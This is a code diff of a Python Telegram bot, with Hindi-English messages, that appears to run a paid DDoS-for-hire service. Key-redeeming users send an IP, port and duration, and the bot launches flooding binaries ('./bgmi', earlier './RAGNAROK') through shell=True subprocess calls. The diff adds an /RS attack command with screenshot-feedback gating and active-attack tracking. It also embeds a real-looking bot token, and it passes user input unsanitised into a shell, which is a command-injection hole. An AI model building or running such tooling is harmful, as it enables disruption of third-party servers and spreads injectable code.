@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 import telebot
 import datetime
-import random
-import string
+import time
 import subprocess
 import threading
+import random
+import string
 from telebot import types
 
 # TELEGRAM BOT TOKEN
@@ -13,12 +14,25 @@ bot = telebot.TeleBot('7973805250:AAE1umqUG8ZhI5Ev0FQe5w-NmkdDtI-dXBs')
 # GROUP AND CHANNEL DETAILS
 GROUP_ID = "-1002252633433"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
+SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 ADMINS = [7129010361]
 
 # GLOBAL VARIABLES
-user_attack_status = {}
-keys = {}  # Generated keys with expiry dates
-user_keys = {}  # Users who redeemed keys
+pending_feedback = {}
+warn_count = {}
+attack_logs = []
+user_attack_count = {}
+keys = {}  # Store generated keys with expiry dates
+redeemed_users = {}  # Store redeemed users with expiry
+active_attacks = []  # Track active attacks
+
+# FUNCTION TO CHECK IF USER IS IN CHANNEL
+def is_user_in_channel(user_id):
+    try:
+        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except:
+        return False
 
 # FUNCTION TO GENERATE RANDOM KEYS
 def generate_key(length=10):
@@ -68,76 +82,103 @@ def redeem_key(message):
         del keys[key]
         return
 
-    user_keys[user_id] = keys[key]
+    redeemed_users[user_id] = keys[key]  # Store user with expiry date
     del keys[key]
 
-    bot.reply_to(message, f"🎉 SUCCESSFULLY REDEEMED!\n📅 Valid till: {user_keys[user_id].strftime('%Y-%m-%d')}", parse_mode="Markdown")
-
-# ATTACK FUNCTION (ACTUAL ATTACK)
-def start_attack(user_id, target, port):
-    user_attack_status[user_id] = True
-    try:
-        subprocess.run(f"./RAGNAROK {target} {port} 300 CRACKS", shell=True, check=True, timeout=300)
-    except subprocess.TimeoutExpired:
-        bot.send_message(GROUP_ID, f"❌ ATTACK ON `{target}:{port}` TIMEOUT HO GAYA!")
-    except subprocess.CalledProcessError:
-        bot.send_message(GROUP_ID, f"❌ ATTACK ON `{target}:{port}` FAILED!")
-    user_attack_status[user_id] = False
-    bot.send_message(GROUP_ID, f"✅ ATTACK ON `{target}:{port}` COMPLETE!")
-
-# /ATTACK COMMAND
-@bot.message_handler(commands=['attack'])
-def send_attack_command(message):
-    user_id = message.from_user.id
-    command = message.text.split()
-
-    if user_id not in user_keys:
-        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
-        return
-
-    if datetime.datetime.now() > user_keys[user_id]:
-        bot.reply_to(message, "⏳ TERA ACCESS EXPIRE HO CHUKA HAI! ADMIN SE BAAT KAR.")
-        return
-
-    if len(command) != 3:
-        bot.reply_to(message, "⚠️ USAGE: /attack <IP> <PORT>")
-        return
-
-    target, port = command[1], command[2]
-
-    try:
-        port = int(port)
-    except ValueError:
-        bot.reply_to(message, "❌ PORT NUMBER HONA CHAHIYE!")
-        return
-
-    if user_attack_status.get(user_id, False):
-        bot.reply_to(message, "⚠️ TERA EK ATTACK PEHLE SE CHAL RAHA HAI!")
-        return
-
-    bot.send_message(message.chat.id, f"🔥 ATTACK STARTING ON `{target}:{port}` FOR `300 SECONDS`!")
-
-    attack_thread = threading.Thread(target=start_attack, args=(user_id, target, port))
-    attack_thread.start()
+    bot.reply_to(message, "🎉 SUCCESSFULLY REDEEMED! AB TU UNLIMITED ATTACK KAR SAKTA HAI 🚀", parse_mode="Markdown")
 
 # /MYINFO COMMAND
 @bot.message_handler(commands=['myinfo'])
 def my_info(message):
     user_id = message.from_user.id
-    expiry = user_keys.get(user_id, "❌ NOT REDEEMED")
-    attack_status = "✅ ON" if user_attack_status.get(user_id, False) else "❌ OFF"
+    info_msg = f"👤 **USER INFO**\n\n🆔 **Telegram ID:** `{user_id}`\n"
 
-    if expiry != "❌ NOT REDEEMED" and datetime.datetime.now() > expiry:
-        expiry = "⏳ EXPIRED"
+    if user_id in redeemed_users:
+        expiry = redeemed_users[user_id].strftime('%Y-%m-%d')
+        info_msg += f"✅ **Access Granted:** Yes\n📅 **Expires on:** {expiry}\n"
+    else:
+        info_msg += "❌ **Access Granted:** No\n"
 
-    info_msg = f"""
-🔹 **USER INFO** 🔹
-👤 USER ID: `{user_id}`
-🛡️ KEY STATUS: `{expiry}`
-📅 EXPIRY DATE: `{expiry if expiry == "❌ NOT REDEEMED" or expiry == "⏳ EXPIRED" else expiry.strftime('%Y-%m-%d')}`
-⚡ ATTACK STATUS: `{attack_status}`
-"""
+    attack_count = user_attack_count.get(user_id, 0)
+    info_msg += f"🚀 **Total Attacks:** {attack_count}\n"
+
     bot.reply_to(message, info_msg, parse_mode="Markdown")
+
+# HANDLE ATTACK COMMAND (UNLIMITED ATTACKS ENABLED)
+@bot.message_handler(commands=['RS'])
+def handle_attack(message):
+    user_id = message.from_user.id
+    command = message.text.split()
+
+    if user_id not in redeemed_users:
+        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
+        return
+
+    if message.chat.id != int(GROUP_ID):
+        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
+        return
+
+    if not is_user_in_channel(user_id):
+        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
+        return
+
+    if pending_feedback.get(user_id, False):
+        bot.reply_to(message, "PEHLE SCREENSHOT BHEJ, WARNA NAYA ATTACK NAHI MILEGA! 😡")
+        return
+
+    if len(command) != 4:
+        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
+        return
+
+    target, port, time_duration = command[1], command[2], command[3]
+
+    try:
+        port = int(port)
+        time_duration = int(time_duration)
+    except ValueError:
+        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
+        return
+
+    if time_duration > 500:
+        bot.reply_to(message, "🚫 700S SE ZYADA ALLOWED NAHI HAI!")
+        return
+
+    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`\n📸 ATTACK KE BAAD SCREENSHOT BHEJNA ZAROORI HAI!"
+
+    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
+
+    # ADD ATTACK TO ACTIVE LIST
+    attack_info = {"user_id": user_id, "target": target, "port": port, "time": time_duration}
+    active_attacks.append(attack_info)
+
+    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1  # Update attack count
+
+    # ATTACK EXECUTION
+    def attack_execution():
+        try:
+            subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
+        except subprocess.TimeoutExpired:
+            bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
+        except subprocess.CalledProcessError:
+            bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
+        finally:
+            bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
+            active_attacks.remove(attack_info)
+
+    threading.Thread(target=attack_execution).start()
+
+# /CHECK COMMAND TO SEE ACTIVE ATTACKS
+@bot.message_handler(commands=['check'])
+def check_attacks(message):
+    if not active_attacks:
+        bot.reply_to(message, "❌ KOI BHI ATTACK ACTIVE NAHI HAI!")
+        return
+
+    check_msg = "📊 **ACTIVE ATTACKS:**\n\n"
+    for attack in active_attacks:
+        check_msg += f"👤 `{attack['user_id']}` ➝ 🎯 `{attack['target']}:{attack['port']}` ({attack['time']}s)\n"
+
+    bot.send_message(message.chat.id, check_msg, parse_mode="Markdown")
 
 # START POLLING
 bot.polling(none_stop=True)
